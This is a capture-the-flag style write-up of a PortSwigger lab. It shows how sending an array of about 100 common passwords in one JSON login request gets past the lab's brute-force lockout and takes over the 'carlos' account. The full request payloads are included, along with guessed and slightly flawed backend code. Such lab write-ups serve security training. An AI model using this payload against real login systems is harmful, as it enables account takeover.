# [Lab 6: Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)

## Description

This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

-   Victim's username: `carlos`
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Solution

The title of the lab indicates that it will be necessary to submit multiple credentials per request to brute force `carlos`'s password. Browse to the login form and submit some incorrect credentials. Intercept the request for future use.

```http
POST /login HTTP/1.1
Host: acd11f361e5ed0ff81509b63009c001c.web-security-academy.net
Cookie: session=f7y2Uhnpolkk7kp1AXoGy7xodwQ4t77Q
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acd11f361e5ed0ff81509b63009c001c.web-security-academy.net/login
Content-Type: text/plain;charset=UTF-8
Origin: https://acd11f361e5ed0ff81509b63009c001c.web-security-academy.net
Content-Length: 44
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close

{"username":"tgihf","password":"pass","":""}
```

The body is a JSON object with keys `username`, `password`, and a empty key that is mapped to an empty string. The empty key is highly unusual. The response of an incorrect login contains the string `Invalid username or password.`.

![](images/Pasted%20image%2020210809120622.png)

Use BurpSuite Intruder to attempt 20 logins as `carlos` to determine if any type of brute force protection mechanism is in play.

Indeed there is some form of brute force protection at play. During the first three incorrect login attempts, the response length was 3288 bytes and the response contained the string `Invalid username or password.`, as noted previously. From the fourth login attempt onward, the response length was 3340 bytes and the response contained the string `You have made too many incorrect login attempts. Please try again in 1 minute(s).`

As hinted by the title of this challenge, it appears the way around the brute force protection mechanism is to submit multiple credentials per request. But how?

The backend server code presumably looks something like the following:

```python
# login.py
credentials: dict = json.loads(request.body)
username: str = credentials['username']
md5_hash: str = hashlib.md5(credentials['password'])
sql_query: SQLPreparedStatement = sql.prepare("SELECT username FROM users WHERE username = ? AND password = ?", 0=username, 1=md5_hash)
rows = db.execute(sql_query)
if (rows > 0):
	authenticate_user()
```

This code doesn't seem to be vulnerable to anything. However, the prompt indicates that there is a logic flaw. Perhaps the backend server code actually looks something like the following:

```python
# login2.py
credentials: dict = json.loads(request.body)
username: str = credentials['username']
for password in passwords:
	md5_hash: str = hashlib.md5(credentials['password'])
	sql_query: SQLPreparedStatement = sql.prepare("SELECT username FROM users WHERE username = ? AND password = ?", 0=username, 1=md5_hash)
	rows = db.execute(sql_query)
	if (rows > 0):
		authenticate_user()
```

It is highly unlikely that anyone in the real world would write an authentication function this way, as users are generally only mapped to a single password. However, following this logic, submit a JSON payload that has a list of all the candidate passwords as the value of the `password` key.

```http
POST /login HTTP/1.1
Host: acde1f981f43e9bf80cc777a00f900d5.web-security-academy.net
Cookie: session=f7y2Uhnpolkk7kp1AXoGy7xodwQ4t77Q
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acde1f981f43e9bf80cc777a00f900d5.web-security-academy.net/login
Content-Type: text/plain;charset=UTF-8
Origin: https://acde1f981f43e9bf80cc777a00f900d5.web-security-academy.net
Content-Length: 1595
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close

{
    "username": "carlos",
    "password": [
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "12345",
        "1234",
        "111111",
        "1234567",
        "dragon",
        "123123",
        "baseball",
        "abc123",
        "football",
        "monkey",
        "letmein",
        "shadow",
        "master",
        "666666",
        "qwertyuiop",
        "123321",
        "mustang",
        "1234567890",
        "michael",
        "654321",
        "superman",
        "1qaz2wsx",
        "7777777",
        "121212",
        "000000",
        "qazwsx",
        "123qwe",
        "killer",
        "trustno1",
        "jordan",
        "jennifer",
        "zxcvbnm",
        "asdfgh",
        "hunter",
        "buster",
        "soccer",
        "harley",
        "batman",
        "andrew",
        "tigger",
        "sunshine",
        "iloveyou",
        "2000",
        "charlie",
        "robert",
        "thomas",
        "hockey",
        "ranger",
        "daniel",
        "starwars",
        "klaster",
        "112233",
        "george",
        "computer",
        "michelle",
        "jessica",
        "pepper",
        "1111",
        "zxcvbn",
        "555555",
        "11111111",
        "131313",
        "freedom",
        "777777",
        "pass",
        "maggie",
        "159753",
        "aaaaaa",
        "ginger",
        "princess",
        "joshua",
        "cheese",
        "amanda",
        "summer",
        "love",
        "ashley",
        "nicole",
        "chelsea",
        "biteme",
        "matthew",
        "access",
        "yankees",
        "987654321",
        "dallas",
        "austin",
        "thunder",
        "taylor",
        "matrix",
        "mobilemail",
        "mom",
        "monitor",
        "monitoring",
        "montana",
        "moon",
        "moscow"
    ],
    "": ""
}
```

The response to this request is a 302 offering a new cookie. Take the cookie and follow the redirect to see that the bypass worked and authentication as `carlos` was successful.
